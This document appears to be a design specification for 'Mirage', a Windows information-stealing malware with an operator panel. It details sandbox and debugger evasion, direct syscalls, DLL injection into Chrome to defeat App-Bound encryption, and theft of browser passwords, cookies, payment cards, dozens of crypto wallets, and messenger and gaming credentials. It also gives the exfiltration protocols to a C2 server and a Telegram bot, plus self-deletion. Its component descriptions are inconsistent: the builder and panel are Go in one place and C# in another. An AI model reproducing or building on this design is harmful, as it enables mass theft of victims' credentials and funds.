# Mirage Stealer — Specification v2.0

## 1. Overview

**Mirage** is an experimental Windows x64 information stealer written in Zig 0.16 + inline ASM with a Go + React web panel. The stealer operates as a standalone EXE (80-150 KB) with a companion DLL for Chrome v20+ App-Bound decryption. All data is exfiltrated to a Go/React panel (primary) and Telegram Bot API (backup).

### 1.1 Design Goals

| Goal | Target | Motivation |
|------|--------|------------|
| Stealth | Static detection < 5/70 (AV) | Comptime XOR strings, IAT-free, no CRT |
| Size | 80-150 KB | Acceptable balance of features vs footprint |
| Coverage | All major browsers + 72 wallets + messengers | Competitive with C# stealers |
| Reliability | Graceful degradation per module | One module crash doesn't kill the process |
| Panel UX | Material Design dashboard | Quick triage of stolen data |

### 1.2 Language Stack

| Component | Language | Build Target | Rationale |
|-----------|----------|--------------|-----------|
| Stealer core | Zig 0.16 + inline ASM | x86_64-windows, ReleaseSmall | Zero-CRT, comptime obfuscation, minimal size |
| Decryptor DLL | C++ (MSVC) | x64 Release | COM IElevator + BCrypt, compiled separately |
| Builder | Go (panel service) | Linux/macOS/Windows | PE-patching .rdata via panel API |
| Panel | Go + React (TypeScript) | Linux/macOS/Windows | shadcn/ui, HTTPS server, dashboard |

---

## 2. Stealer Architecture (Mirage.Stealer)

### 2.1 Entry & Anti-Analysis

```
main() → AntiAnalysis gate → start() → pipeline
```

**Anti-analysis checks** (weighted scoring, abort if > threshold):
- Debugger: `NtQueryInformationProcess(ProcessDebugFlags)` via syscall
- Sandbox: RAM < 2 GB, screen < 1024x768, CPU cores < 2
- VM: Check registry for VM artifacts (HKLM\HARDWARE\DESCRIPTION\System\BIOS)
- Emulator: Timing check (rdtsc + Sleep(100) + rdtsc delta)
- Process list: taskmgr, processhacker, wireshark, procexp, dbgview

### 2.2 Syscall Layer

**Halo's Gate** — inline ASM (`asm volatile`), no MASM stubs:
- Dynamic SSN resolution from ntdll export table
- Neighbor walk (TartarusGate) for hooked stubs
- Win11 24H2 prologue support (`48 8B C4`, `48 89 5C 24`)
- 22 resolved syscalls (21 ntdll + 1 win32u):
  `NtAllocateVirtualMemory, NtProtectVirtualMemory, NtFreeVirtualMemory, NtWriteVirtualMemory, NtClose, NtOpenFile, NtReadVirtualMemory, NtCreateSection, NtMapViewOfSection, NtQueryInformationProcess, NtCreateFile, NtWriteFile, NtQuerySystemInformation, NtDelayExecution, NtCreateEvent, NtWaitForSingleObject, NtOpenKey, NtQueryValueKey, NtSetInformationProcess, NtGetContextThread, NtSetContextThread, NtUserGetSystemMetrics`

Additional win32u syscalls via `resolveWin32u()`:
- `NtUserGetSystemMetrics` — screen resolution check

### 2.3 Module Orchestration

```
start()
├── initConfig()            — decrypt comptime config with XOR key
├── initSyscalls()          — resolve all SSNs
├── antiAnalysis()          — weighted scoring, return if unsafe
├── installPersistence()    — optional startup registry/key
│
├── collectSystemInfo()     — OS, hardware, network, WiFi, screenshot, file grabber
├── collectBrowsers()       — 36 Chromium (with App-Bound DLL) + 10 Gecko
├── collectWallets()        — 62 extension wallets + 10 desktop wallets
├── collectMessengers()     — Discord, Telegram, Signal, Pidgin
├── collectGaming()         — Steam, Uplay, Minecraft, Battle.net, Roblox
│
├── createArchive()         — ZIP all collected files in memory
├── sendToPanel()           — primary: HTTPS POST to panel server
├── sendToTelegram()        — backup: HTTPS POST to Telegram Bot API
│
├── cleanup()               — delete archive, zero memory
└── selfDelete()            — remove executable from disk
```

Each module is a standalone function returning a result type. The orchestrator logs success/failure per module but continues on error.

### 2.4 Threading

Single-threaded execution for stealth. Each module runs sequentially. The total execution time target is < 30 seconds on modern hardware.

### 2.5 File System Access

All stolen data is written to `%TEMP%\<random_hex>\` and cleaned up after exfiltration. Random directory name prevents path-based detection.

---

## 3. Browser Theft

### 3.1 Chromium — Browser Detection Paths

All paths XOR-encrypted at comptime. 36 Chromium-based browsers:

| Browser | Profile Path |
|---------|-------------|
| Chrome | `%LOCALAPPDATA%\Google\Chrome\User Data` |
| Chrome (x86) | `%LOCALAPPDATA%\Google (x86)\Chrome\User Data` |
| Chrome SxS | `%LOCALAPPDATA%\Google\Chrome SxS\User Data` |
| Edge | `%LOCALAPPDATA%\Microsoft\Edge\User Data` |
| Brave | `%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data` |
| Opera | `%APPDATA%\Opera Software\Opera Stable` |
| Opera GX | `%APPDATA%\Opera Software\Opera GX Stable` |
| Vivaldi | `%LOCALAPPDATA%\Vivaldi\User Data` |
| Yandex | `%LOCALAPPDATA%\Yandex\YandexBrowser\User Data` |
| Chromium | `%LOCALAPPDATA%\Chromium\User Data` |
| CentBrowser | `%LOCALAPPDATA%\CentBrowser\User Data` |
| CocCoc | `%LOCALAPPDATA%\CocCoc\Browser\User Data` |
| Amigo | `%LOCALAPPDATA%\Amigo\User Data` |
| Torch | `%LOCALAPPDATA%\Torch\User Data` |
| Kometa | `%LOCALAPPDATA%\Kometa\User Data` |
| Orbitum | `%LOCALAPPDATA%\Orbitum\User Data` |
| 7Star | `%LOCALAPPDATA%\7Star\7Star\User Data` |
| Sputnik | `%LOCALAPPDATA%\Sputnik\Sputnik\User Data` |
| Iridium | `%LOCALAPPDATA%\Iridium\User Data` |
| Dragon | `%LOCALAPPDATA%\Comodo\Dragon\User Data` |
| Epic | `%LOCALAPPDATA%\Epic Privacy Browser\User Data` |
| Uran | `%LOCALAPPDATA%\uCozMedia\Uran\User Data` |
| Slimjet | `%LOCALAPPDATA%\Slimjet\User Data` |
| Chedot | `%LOCALAPPDATA%\Chedot\User Data` |
| Elements | `%LOCALAPPDATA%\Elements Browser\User Data` |
| QIP Surf | `%LOCALAPPDATA%\QIP Surf\User Data` |
| 360Browser | `%LOCALAPPDATA%\360Browser\Browser\User Data` |
| DCBrowser | `%LOCALAPPDATA%\DCBrowser\User Data` |
| UR Browser | `%LOCALAPPDATA%\UR Browser\User Data` |
| Maple | `%LOCALAPPDATA%\MapleStudio\ChromePlus\User Data` |
| Fenrir | `%LOCALAPPDATA%\Fenrir Inc\Sleipnir5\setting\modules\ChromiumViewer` |
| Catalina | `%LOCALAPPDATA%\CatalinaGroup\Citrio\User Data` |
| Coowon | `%LOCALAPPDATA%\Coowon\Coowon\User Data` |
| Liebao | `%LOCALAPPDATA%\liebao\User Data` |
| Maxthon | `%LOCALAPPDATA%\Maxthon3\User Data` |
| K-Melon | `%LOCALAPPDATA%\K-Melon\User Data` |

**Databases** (SQLite via sqLoot):

| File | Data Extracted |
|------|---------------|
| `Login Data` | origin_url, username, password |
| `Cookies` | host_key, name, encrypted_value, path, expires |
| `Web Data` | credit card number, exp month/year, name |
| `History` | url, title, visit_count |
| `Bookmarks` | JSON format, parsed manually |
| `Autofill` | name, value |

### 3.2 Chrome v20+ App-Bound Decryption

**Flow:**
1. Read `encrypted_key` from `Local State` JSON (DPAPI or App-Bound)
2. Try DPAPI `CryptUnprotectData` directly (works for pre-v20)
3. If App-Bound (detected by key format): drop `MirageDecryptor.dll` to `%TEMP%`, create `chrome.exe --headless` suspended, inject DLL via `CreateRemoteThread` with `LoadLibrary`, resume, wait for named pipe response containing decrypted key
4. Use decrypted key + `saltysalt` PBKDF2 → AES-256-GCM decrypt each encrypted field

**Fallback:** If injection fails, skip App-Bound browsers, collect DPAPI-only (Opera, Vivaldi).

### 3.3 Firefox (Gecko) — 10 Browsers

| Data | File | Method |
|------|------|--------|
| Passwords | `logins.json` + `key4.db` | NSS PKCS11 decryption |
| Cookies | `cookies.sqlite` | SQLite read (no encryption) |
| History | `places.sqlite` | SQLite read |
| Bookmarks | `places.sqlite` | SQLite read |

**Gecko browser detection paths:**

| Browser | Profile Path |
|---------|-------------|
| Firefox | `%APPDATA%\Mozilla\Firefox\Profiles` |
| Thunderbird | `%APPDATA%\Thunderbird\Profiles` |
| SeaMonkey | `%APPDATA%\Mozilla\SeaMonkey\Profiles` |
| Waterfox | `%APPDATA%\Waterfox\Profiles` |
| Pale Moon | `%APPDATA%\Moonchild Productions\Pale Moon\Profiles` |
| K-Meleon | `%APPDATA%\K-Meleon\Profiles` |
| IceDragon | `%APPDATA%\Comodo\IceDragon\Profiles` |
| Cyberfox | `%APPDATA%\8pecxstudios\Cyberfox\Profiles` |
| BlackHaw | `%APPDATA%\NETGATE Technologies\BlackHaw\Profiles` |
| Mercury | `%APPDATA%\mercury\Profiles` |

Firefox decryption uses NSS3 (mozglue.dll -> nss3.dll) — LoadLibrary + P/Invoke to `PK11_Authenticate`, `PK11_FindCertificates`, etc.

---

## 4. Wallet Theft

### 4.1 Browser Extension Wallets (62)

Detected by directory existence under each Chromium profile's `Local Extension Settings/<extension_id>`:

| Wallet | Extension ID |
|--------|-------------|
| MetaMask | `nkbihfbeogaeaoehlefnkodbefgpgknn` |
| Binance | `fhbohimaelbohpjbbldcngcnapndodjp` |
| Coinbase | `hnfanknocfeofbddgcijnmhnfnkdnaad` |
| Phantom | `bfnaelmomeimhlpmgjnjophhpkkoljpa` |
| Trust | `egjidjbpglichdcondbcbdnbeeppgdph` |
| TronLink | `ibnejdfjmmkpcnlpebklmnkoeoihofec` |
| Ronin | `fnjhmkhhmkbjkkabndcnnogagogbneec` |
| Keplr | `dmkamcknogkgcdfhhbddcghachkejeap` |
| Yoroi | `ffnbelfdoeiohenkjibnmadjiehjhajb` |
| MetaMask2 | `ejbalbakoplchlghecdalmeeeajnimhm` |
| ExodusWeb3 | `aholpfdialjgjfhomihkjbmgjidlcdno` |
| Guarda Wallet | `fcglfhcjfpkgdppjbglknafgfffkelnm` |
| TokenPocket | `mfgccjchihfkkindfppnaooecgfneiii` |
| Math | `afbcbjpbpfadlkmhmclhkeeodmamcflc` |
| Coin98 | `aeachknmefphepccionboohckonoeemg` |
| Nifty | `jbdaocneiiinmjbjlgalhcelgbejmnid` |
| TempleTezos | `ookjlbkiijinhpmnjffcofjonbfbgaoc` |
| SubWallet | `onhogfjeacnfoofkfgppdlbmlmnplgbn` |
| Talisman | `fijngjgcjhjmmpcmkeiomlglpeiijkld` |
| Zerion | `klghhnkeealcohjlanjjlneabhbmpfpl` |
| Rabby | `acmacodkjbdgnolefmlmkchkdgmemhob` |
| Core | `agoakfejjabomempkjlepdflaleeobhb` |
| Pontem | `phkbamefinggmakgklpkljjmgibohnba` |
| Petra | `ejjladinnckdgjemekebdpeokbikhfci` |
| Martian | `efbglgofoippbgcjepnhiblaibcnclgk` |
| Fewcha | `ebfidpplhabeedpnhjnobghokpiioolj` |
| Safepal | `lgmpcpglpngdoalbgeoldeajfclnhafa` |
| Ton | `nphplpgoakhhjchkkhmiggakijnkhfnd` |
| XDEFI | `hmeobnfnfcmdkdcmlblgagmfpfboieaf` |
| Oxygen | `fhilaheimglignddkjgofkcbgekhenbh` |
| Nami | `lpfcbjknijpeeillifnkikgncikgfhdo` |
| Liquality | `kpfopkelmapcoipemfendmdcghnegimn` |
| Solflare | `bhhhlbepdkbapadjdnnojkbgioiodbic` |
| OKX | `mcohilncbfahbmgdjkbpemcciiolgcge` |
| Wombat | `amkmjjmmflddogmhpjloimipbofnfjih` |
| MaiarDeFi | `dngmlblcodfobpdpecaadgfbcggfjfnm` |
| MEWCX | `nlbmnnijcnlegkjjpcfjclmcfggfefdm` |
| Saturn | `nkddgncdjgjfcddamfgcmfnlhccnimig` |
| TerraStation | `aiifbnbfobpmeekipheeijimdpnlpgpp` |
| Ever | `cgeeodpfagjceefieflmdfphplkenlfk` |
| iWallet | `kncchdigobghenbbaddojjnnaogfppfj` |
| KardiaChain | `pdadjkfkgcafgbceimcpbkalnfnepbnk` |
| BoltX | `aodkkagnadcbobfpggfnjeongemjbjca` |
| Slope | `pocmplpaccanhmnllbbkpgfliimjljgo` |
| Sollet | `fhmfendgdocmcbmfikdcogofphimnkno` |
| Starcoin | `mfhbebgoclkghebffdldpobeajmbecfk` |
| XinPay | `bocpokimicclpaiekenaeelehdjllofo` |
| Equal | `blnieiiffboillknjnepogjhkgnoapac` |
| Finnie | `cjmkndjhnagcfbpiemnkdpomccnjblmj` |
| Mobox | `fcckkdbjnoikooededlapcalpionmalo` |
| Crocobit | `pnlfjmlcjdjgkddecgincndfgegkecke` |
| Bitapp | `fihkakfobkmkjojpchpfgcmhfjnmnfpi` |
| Swash | `cmndjbecilbocjfkibfbifhngkdmjgog` |
| Jaxx Liberty | `cjelfplplebdjjenllpjcblmjkfcffne` |
| Venom | `ojggmchlghnjlapmfbnjholfjkiidbch` |
| Guarda | `hpglfhgfnhbgpjdenjgmdgoeiappafln` |
| Sui | `opcgpfmipidbgpenhmajoajpbobppdil` |
| XMR.PT | `eigblbgjknlfbajkfhopmcojidlgcehm` |
| PaliWallet | `mgffkfbidihjpoaomajlbgchddlicgpn` |
| ICONex | `flpiciilemghbmfalicajoolhkkenfel` |
| Harmony | `fnnegphlobjdpkhecapkijjdkgcjhkib` |
| Guild | `nanjmdknhkinifnkgdcggcfnhdaammmj` |

**Method**: Copy extension's `Local Extension Settings/<id>` directory (LevelDB) into archive.

### 4.2 Desktop Wallets (10)

| Wallet | Path |
|--------|------|
| Exodus | `%APPDATA%\Exodus\exodus.wallet` |
| Electrum | `%APPDATA%\Electrum\wallets` |
| Atomic | `%APPDATA%\atomic\Local Storage\leveldb` |
| Wasabi | `%APPDATA%\WalletWasabi\Client\Wallets` |
| Coinomi | `%APPDATA%\Coinomi\Coinomi\wallets` |
| Guarda | `%APPDATA%\Guarda\Local Storage\leveldb` |
| Jaxx Liberty | `%APPDATA%\Jaxx Liberty\Local Storage\leveldb` |
| MultiBitHD | `%APPDATA%\MultiBitHD` |
| Zcash | `%APPDATA%\Zcash` |
| Monero | `%APPDATA%\monero-project\monero-core\wallets` |

**Method**: Copy wallet directory or files into archive.

---

## 5. Messenger Theft

### 5.1 Discord
- Scan `%APPDATA%\discord\Local Storage\leveldb\*.log` and `*.ldb` for `[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,27}` regex pattern
- Validate tokens via Discord API `GET /users/@me`

### 5.2 Telegram Desktop
- Copy `%APPDATA%\Telegram Desktop\tdata` directory (requires process to be closed or volume shadow copy)

### 5.3 Signal
- Copy `%APPDATA%\Signal\config.json` and `%APPDATA%\Signal\sql\db.sqlite`

### 5.4 Pidgin
- Parse `%APPDATA%\.purple\accounts.xml` for saved IM accounts
- Copy `.purple\logs\*` for chat history

---

## 6. Gaming Theft

### 6.1 Steam
- Copy `ssfn*` files from `%ProgramFiles(x86)%\Steam`
- Copy `config\config.vdf` and `config\loginusers.vdf`
- Enumerate `userdata\<steam_id>\` directories

### 6.2 Uplay (Ubisoft Connect)
- Copy `%LOCALAPPDATA%\Ubisoft Game Launcher\*`

### 6.3 Minecraft
- Copy `%APPDATA%\.minecraft\*` (saves, servers.dat, launcher_profiles.json)
- Detect alternate launchers (ATLauncher, FTBApp, GDLauncher, MultiMC, PolyMC, Prism, TLauncher, Technic)

### 6.4 Battle.net
- Copy `.db` and `.config` files from `%APPDATA%\Battle.net\`

### 6.5 Roblox
- Read `%LOCALAPPDATA%\Roblox\LocalStorage\RobloxCookies.dat` via DPAPI decryption
- Parse `appStorage.json` for account metadata

---

## 7. System Info Collection

The `system_info` module aggregates data from six sub-modules into a single text report:

| Sub-Module | Data | Source | Method |
|------------|------|--------|--------|
| OS Info | Version, build number, install date | Registry `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion` | NtOpenKey / NtQueryValueKey |
| Hardware | CPU name, core count, GPU, RAM | Registry + `GlobalMemoryStatusEx` | NtQuerySystemInformation |
| Network | Hostname, local IP, MAC, public IP | `GetAdaptersInfo`, `api.ipify.org` | NtQuerySystemInformation + SChannel HTTP |
| WiFi | Saved SSIDs + passwords | `WlanGetProfileList` / `WlanGetProfile` | wlanapi.dll (LdrLoadDll) |
| Screenshot | Desktop bitmap (JPEG ~50-200 KB) | `CreateDC("DISPLAY")` + `BitBlt` + GDI | GDI32 via LdrLoadDll |
| File Grabber | Files by mask from Desktop/Documents | Recursive file enumeration | NtCreateFile / NtReadFile |

---

## 8. Packing & Exfiltration

### 8.1 Archive Format
- In-memory ZIP using custom `zip.zig` (PKZIP Store method, no compression)
- CRC32 lookup table generated at comptime (`crc32_table[256]`)
- Password: `mirage-{random_hex}`
- Structure: `<uuid>/` prefix for collision-free panel ingestion
- File entries: Local file header + file data + central directory + EOCD

### 8.2 Mirage.Panel Protocol

```
POST /api/log HTTP/1.1
Host: <panel_ip>:<panel_port>
Content-Type: multipart/form-data; boundary=----Mirage
Authorization: Bearer <xor-encrypted static token>

------Mirage
Content-Disposition: form-data; name="metadata"
Content-Type: application/json

{"hwid":"...","os":"...","username":"...","ip":"...","timestamp":...}
------Mirage
Content-Disposition: form-data; name="archive"; filename="data.zip"
Content-Type: application/zip

<binary ZIP data>
------Mirage--
```

### 8.3 Telegram Fallback Protocol

```
POST /bot<TOKEN>/sendDocument HTTP/1.1
Host: api.telegram.org
Content-Type: multipart/form-data

chat_id: <CHAT_ID>
caption: <system info, clipped to 997 chars + "...">
document: <ZIP as multipart>
```

Caption format:
```
🖥 <OS> | <CPU> | <RAM GB> GB
🌐 <IP> | <Country>
👤 <Username>@<Hostname>
🔑 <count> passwords | 🍪 <count> cookies
💳 <count> cards
👛 <count> wallets
📸 screenshot | 📁 <count> files
#mirage
```

### 8.4 TLS via SChannel
- Dynamic load `secur32.dll` via LdrLoadDll
- Initialize Schannel credential
- Handshake with server certificate validation (optional — skip validation for panel self-signed cert)
- HTTP/1.1 over encrypted connection

---

## 9. Comptime Configuration (config.zig)

Generated by builder.py, XOR-encrypted at comptime using `STRING_KEY_ENC`:

```zig
pub const SEED: u32 = <random>;
pub const STRING_KEY_ENC: [16]u8 = .{ <xor bytes> };    // XOR key for strings
pub const ENABLE_PERSISTENCE: bool = false;
pub const ENABLE_SCREENSHOT: bool = true;
pub const ENABLE_TELEGRAM_BACKUP: bool = true;
pub const TELEGRAM_BOT_TOKEN: [46]u8 = .{ <xor bytes> };
pub const TELEGRAM_CHAT_ID: [18]u8 = .{ <xor bytes> };
pub const C2_HOST: [16]u8 = .{ <xor bytes> };
pub const C2_PORT: u16 = 8443;
pub const SLEEP_MIN_MS: u64 = 5000;
pub const SLEEP_JITTER_MS: u64 = 3000;
pub const EVASION_SCORE_THRESHOLD: u32 = 60;
pub const VM_MIN_RAM: u64 = 2 * 1024 * 1024 * 1024;
pub const VM_MIN_CPU_CORES: u8 = 2;
pub const VM_MIN_SCREEN_WIDTH: u32 = 1280;
pub const VM_MIN_SCREEN_HEIGHT: u32 = 720;
pub const VM_TIMING_ANOMALY_TSC: u64 = 10_000_000;
```

All string literals are XOR-encrypted at comptime using `STRING_KEY_ENC`. No plaintext strings survive in the binary.

---

## 10. Builder (Mirage.Builder, C# WinForms)

### 10.1 Workflow
1. Load `Mirage.Stealer.exe` as raw byte array
2. Locate `.rdata` section containing the config signature `MIRAGECFG`
3. XOR-encrypt config values using the builder's key
4. Overwrite the placeholder bytes in `.rdata`
5. Save modified `Mirage.Stealer.exe` as output
6. (Optional) Append `MirageDecryptor.dll` as overlay
7. Calculate SHA-256 and VirusTotal link for user

### 10.2 UI Elements
- TextBox: C2 Host (e.g., `192.168.1.100`)
- TextBox: C2 Port (e.g., `8443`)
- TextBox: Telegram Bot Token
- TextBox: Telegram Chat ID
- Checkboxes: Enable Persistence, Enable Screenshot, Enable Telegram Backup
- TextBox: Grabber File Masks
- Button: [Build] → selects output path
- Status bar: build progress + resulting file hash

---

## 11. Panel (Mirage.Panel, C# WPF)

### 11.1 Server
- ASP.NET Core Minimal API (self-hosted via `WebApplication.Create`)
- HTTPS with optional self-signed cert (auto-generated on first run)
- Endpoints:
  - `POST /api/log` — accept stealer log
  - `GET /api/stats` — return dashboard JSON
  - `GET /api/search?q=<query>` — search across all stolen passwords
- Rate limiting: 100 requests/min per IP

### 11.2 Storage
- SQLite database with tables:
  - `builds` — id, config_hash, created_at, ip, user_agent
  - `sessions` — id, build_id, hwid, os, username, ip, country, created_at
  - `passwords` — id, session_id, url, username, password, browser
  - `cookies` — id, session_id, domain, name, value, path
  - `cards` — id, session_id, number, exp, holder
  - `wallets` — id, session_id, name, path
  - `files` — id, session_id, filename, size
  - `system_info` — id, session_id, cpu, gpu, ram, screen, av

### 11.3 Dashboard (MaterialDesignInXAML)
- **Stats cards total**: sessions today, total passwords, total wallets, online now
- **Map**: country heatmap (IP geolocation)
- **Timeline**: sessions over last 24h (LiveCharts2)
- **Browser pie chart**: Chrome vs Edge vs Firefox vs Opera
- **Recent sessions table**: timestamp, IP, country, OS, HWID
- **Search**: full-text search across passwords, cookies, cards

### 11.4 Telegram Proxy
- On each incoming log, the panel optionally forwards a summary to Telegram
- Configurable per-build: some builds send Telegram, some don't
- The panel has its own Telegram bot that forwards selected logs

---

## 12. Anti-Forensics

| Technique | Implementation |
|-----------|---------------|
| Comptime XOR strings | All sensitive strings XOR'd at compile time with seed |
| IAT evasion | Ntdll functions resolved via PEB + CRC32 hash, kernel32 via LdrLoadDll |
| No CRT | `freestanding` target, no msvcrt dependency |
| No .rdata strings | API names are CRC32 hashes (4 bytes), not strings |
| Temp cleanup | `%TEMP%\<random>\` directory deleted after exfiltration |
| Self-delete | Move to `%TEMP%\~delete.tmp`, spawn cmd `/c del`, exit |
| Memory zeroing | `secureZero` on keys, tokens, config after use |
| Mutex | Single instance via `NtCreateEvent` with unique name |

---

## 13. Error Handling & Reliability

- Each module returns a result type. Orchestrator logs failure but continues.
- No unwinding (`try`/`catch`) in payload — single-threaded with explicit error checks
- Panic handler: override `std.debug.panic` to call `NtTerminateProcess` (no message box)
- Network timeout: 15 seconds per request via `NtWaitForSingleObject` on socket event
- Fallback chain: Panel → Telegram → (future) Discord webhook

---

## 14. Build System

### 14.1 Stealer (Zig)
```bash
zig build -Dtarget=x86_64-windows -Doptimize=ReleaseSmall -fsingle-threaded
```

`build.zig` will:
- Set `x86_64-windows-msvc` target
- Strip debug symbols
- Import `config.zig` as anonymous comptime module
- No external C libraries (custom `zip.zig` replaces miniz)
- Subsystem: Windows (no console window)

### 14.2 Decryptor DLL (C++ MSVC)
```bash
cl /O2 /MT /DLL mira_decryptor.cpp /Fe:MirageDecryptor.dll /link ole32.lib
```

### 14.3 Builder (C#)
```bash
dotnet build -c Release
```

### 14.4 Panel (C#)
```bash
dotnet publish -c Release -o publish
```

---

## 15. PE Structure (Output Binary)

| Section | Content |
|---------|---------|
| `.text` | Zig machine code (no CRT) |
| `.rdata` | XOR-encrypted config (signature `MIRAGECFG`), read-only data |
| `.data` | Global variables (SSN globals, runtime state) |
| `.rsrc` | (Optional) Version info, icon |
| Overlay | (Optional) MirageDecryptor.dll appended after last section |

Entry point: `main` (not `WinMain`, console-free via linker flag)

---

## 16. Dependencies

| Component | Dependency | Size | Purpose |
|-----------|-----------|------|---------|
| Stealer | zip.zig (custom) | ~2 KB | PKZIP Store archive creation (CRC32 LUT) |
| Stealer | secur32.dll (system) | — | SChannel TLS |
| Stealer | bcrypt.dll (system) | — | AES-GCM/ChaCha20/BCrypt |
| Stealer | crypt32.dll (system) | — | DPAPI CryptUnprotectData |
| Stealer | ole32.dll (system) | — | COM CoCreateInstance (App-Bound Elevator) |
| Stealer | ws2_32.dll (system) | — | Sockets |
| Decryptor DLL | ole32.dll (system) | — | COM CoCreateInstance |
| Decryptor DLL | bcrypt.dll (system) | — | AES-GCM decryption |
| Panel | MaterialDesignThemes | NuGet | UI toolkit |
| Panel | LiveCharts2 | NuGet | Dashboard charts |
| Panel | SQLitePCLRaw | NuGet | SQLite database |
| Builder | — | — | No external dependencies |

---

## 17. Test Harness

A minimal Zig test module (`main.zig` test suite) that:
- Validates all 22 syscall SSNs via Halo's Gate resolution
- Tests PEB walk, export resolution, gadget pool
- Tests anti-analysis evasion (RAM, CPU, screen, debugger, timing, registry)
- Validates PEB unlinking and mutex acquisition
- Tests DPAPI, AES-GCM, ChaCha20-Poly1305, archive encryption, Chrome key parser
- Validates sqLoot SQLite parser (header, varint, serial types, columns, records)
- Tests Chrome decryption integration (key derivation, AES-GCM, App-Bound COM)
- Validates all 36 Chromium + 10 Gecko browser path configurations
- Runs locally without exfiltration

```bash
zig build test -Dtarget=x86_64-windows
```
